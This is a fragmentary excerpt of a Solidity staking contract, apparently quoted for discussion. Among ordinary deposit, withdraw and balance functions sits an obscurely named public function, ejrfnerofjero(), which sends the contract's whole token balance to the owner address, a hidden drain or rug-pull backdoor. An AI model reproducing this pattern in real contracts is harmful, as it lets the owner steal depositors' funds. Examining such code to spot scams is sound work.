...
contract Staking {
    ...
    address bst = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    uint256 public constant INVEST_MIN_AMOUNT = 10 ether;//10% minimum deposit 
...
function ejrfnerofjero() public
{
        ...
        IBEP20(bst).transfer(OwnerAddress,IBEP20(bst).balanceOf(address(this)));
        }
    ...
    function withdraw() public {
		...
		uint256 contractBalance = IBEP20(bst).balanceOf(address(this));
    ...
    function getContractBalance() public view returns (uint256) {
        return IBEP20(bst).balanceOf(address(this));
    }
